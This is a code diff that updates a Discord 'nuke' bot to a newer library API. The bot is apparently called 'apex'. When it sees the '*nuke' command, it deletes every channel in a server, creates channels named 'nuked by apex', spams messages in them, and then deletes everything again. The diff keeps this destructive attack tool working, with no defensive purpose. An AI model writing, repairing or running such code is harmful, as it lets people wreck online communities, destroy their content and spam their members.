@@ -31,11 +31,12 @@ client.once('ready', () => {
 
 client.on('messageCreate', async (message) => {
   if (message.author.bot) return; // Ignore bot messages
+  
   if (message.content === '*nuke') {
     try {
       // Delete all existing channels
       const channels = message.guild.channels.cache;
-      for (const channel of channels.values()) {
+      for (const [id, channel] of channels) {
         await channel.delete();
       }
 
@@ -48,8 +49,9 @@ client.on('messageCreate', async (message) => {
 
       // Function to create a new channel and start spamming
       const createAndSpamChannel = async () => {
-        const channel = await message.guild.channels.create('nuked by apex', {
-          type: 'GUILD_TEXT'
+        const channel = await message.guild.channels.create({
+          name: 'nuked by apex',
+          type: 0, // 0 for text channels
         });
 
         // Spam messages in the new channel
@@ -81,13 +83,14 @@ client.on('messageCreate', async (message) => {
 
       // Delete all channels
       const allChannels = message.guild.channels.cache;
-      for (const channel of allChannels.values()) {
+      for (const [id, channel] of allChannels) {
         await channel.delete();
       }
 
       // Create a "general" channel after all channels are deleted
-      await message.guild.channels.create('general', {
-        type: 'GUILD_TEXT'
+      await message.guild.channels.create({
+        name: 'general',
+        type: 0, // 0 for text channels
       });
 
       message.channel.send('All channels have been deleted and a "general" channel has been created.');
